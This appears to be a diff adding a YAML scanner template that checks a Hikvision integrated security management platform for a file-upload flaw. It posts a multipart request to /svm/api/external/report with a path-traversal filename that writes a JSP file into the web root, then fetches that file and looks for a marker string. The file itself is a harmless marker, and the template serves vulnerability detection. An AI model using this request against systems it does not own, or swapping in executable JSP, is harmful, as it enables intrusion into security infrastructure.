@@ -1,0 +1,19 @@
+name: HIKVISION-综合安防管理平台-svm文件上传
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules: 
+  - method: POST
+    path: /svm/api/external/report
+    headers:
+      Content-Type: "multipart/form-data; boundary=00content0boundary00"    
+    body: "--00content0boundary00\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../tomcat85linux64.1/webapps/els/static/360.jsp\"\r\nContent-Type: application/zip\r\n\r\n111666\r\n--00content0boundary00--"
+    expression:
+      headers:
+        Content-Type: application/json
+  - method: GET
+    path: /els/static/360.jsp
+    expression:
+      status: 200
+      body_all: ["111666"]
